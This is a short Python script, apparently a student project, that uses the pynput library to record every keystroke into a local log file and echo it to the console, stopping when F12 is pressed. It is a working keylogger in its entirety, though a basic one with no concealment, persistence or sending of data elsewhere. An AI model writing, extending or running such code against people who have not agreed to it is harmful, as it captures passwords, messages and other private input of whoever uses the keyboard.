from  pynput.keyboard import Listener


def on_press(key):
    key = str(key)
    key = key.replace("'", "")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.shift":
        key = ""
    if  key == "Key.ctrl_l":
        key = ""
    if key == "Key.alt_l":
        key = ""
    if key == "Key.tab":
        key = "\t";
    if key == "Key.enter":
        key = "\n"
    if key == "Key.space":
        key = "_"
    with open("D:\\Semeter 5\\PBL4\\PBL\\log.txt", "a") as file:
        file.write(key)
    print(key , end = '')


with  Listener(on_press =  on_press) as hacker:
    hacker.join()
    
